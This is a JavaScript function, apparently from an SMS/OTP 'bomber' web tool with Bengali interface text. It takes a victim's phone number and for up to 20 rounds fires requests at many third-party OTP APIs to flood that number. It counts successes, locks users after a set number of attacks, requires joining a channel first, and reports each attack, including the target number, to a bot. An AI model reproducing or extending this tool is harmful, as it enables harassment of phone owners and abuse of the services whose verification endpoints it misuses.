// ==========================================
// MAIN ATTACK FUNCTION
// ==========================================
async function startAttack() {
    if (localStorage.getItem('fire_channel_joined') !== 'true') {
        document.getElementById('joinPopup').classList.add('active');
        return;
    }
    
    if (checkAndShowLock()) {
        return;
    }
    
    let count = getAttackCount();
    if (count >= LOCK_LIMIT) {
        applyLock();
        checkAndShowLock();
        return;
    }
    
    let number = document.getElementById("number").value.trim();
    let amount = parseInt(document.getElementById("amount").value);
    
    if (!number || !amount || amount <= 0) { 
        alert("⚠️ সঠিক নাম্বার ও রাউন্ড দিন!"); 
        return; 
    }
    if (amount > 20) {
        alert("⚠️ সর্বোচ্চ ২০ রাউন্ড পর্যন্ত দেওয়া যাবে!");
        document.getElementById("amount").value = 20;
        amount = 20;
    }
    
    if (count + 1 >= LOCK_LIMIT) {
        const confirmMsg = `⚠️ সতর্কতা! এই অ্যাটাকের পর আপনি ${LOCK_LIMIT} বার অ্যাটাক সম্পন্ন করবেন এবং ৩ ঘন্টার জন্য লক হয়ে যাবেন!\n\nআপনি কি নিশ্চিত?`;
        if (!confirm(confirmMsg)) {
            return;
        }
    }
    
    number = number.replace(/\s+/g, "");
    if (!number.startsWith("0")) number = "0" + number;
    
    if (APIS.length === 0) {
        alert("⚠️ কোনো API পাওয়া যায়নি! রিলোড করুন।");
        return;
    }
    
    const btn = document.getElementById("sendBtn");
    btn.disabled = true;
    window._attackRunning = true;
    document.getElementById("btnText").textContent = "ATTACKING...";
    document.getElementById("progressSection").style.display = "block";
    
    let success = 0, failed = 0;
    
    for (let round = 0; round < amount; round++) {
        (await callKarobarAPI(number)) ? success++ : failed++;
        const results = await Promise.all(APIS.map(api => callAPI(api, number)));
        results.forEach(r => r ? success++ : failed++);
        (await callKarobarAPI(number)) ? success++ : failed++;
        
        const totalCalls = (round + 1) * (APIS.length + 2);
        const pct = ((round + 1) / amount * 100).toFixed(0);
        
        document.getElementById("progressFill").style.width = pct + "%";
        document.getElementById("progressPercent").textContent = pct + "%";
        document.getElementById("successCount").textContent = success;
        document.getElementById("failCount").textContent = failed;
        document.getElementById("totalCount").textContent = totalCalls;
        
        if (round < amount - 1) await new Promise(r => setTimeout(r, 400));
    }
    
    btn.disabled = false;
    window._attackRunning = false;
    document.getElementById("btnText").textContent = "START ATTACK";
    
    const newCount = incrementAttackCount();
    
    try {
        await sendAttackLogToBot(number, amount, success, failed);
    } catch(e) { console.error("Log save error:", e); }
    
    if (newCount >= LOCK_LIMIT) {
        applyLock();
        setTimeout(() => {
            checkAndShowLock();
        }, 500);
    }
}

